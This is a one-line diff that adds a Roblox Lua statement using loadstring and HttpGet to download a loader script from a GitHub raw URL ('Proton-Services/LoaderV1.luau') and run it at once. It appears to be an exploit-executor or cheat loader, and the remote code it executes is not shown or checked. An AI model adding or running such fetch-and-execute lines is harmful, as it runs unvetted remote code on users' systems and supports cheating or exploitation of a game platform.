@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/t0x1c-dev/Proton-Services/main/LoaderV1.luau'))()
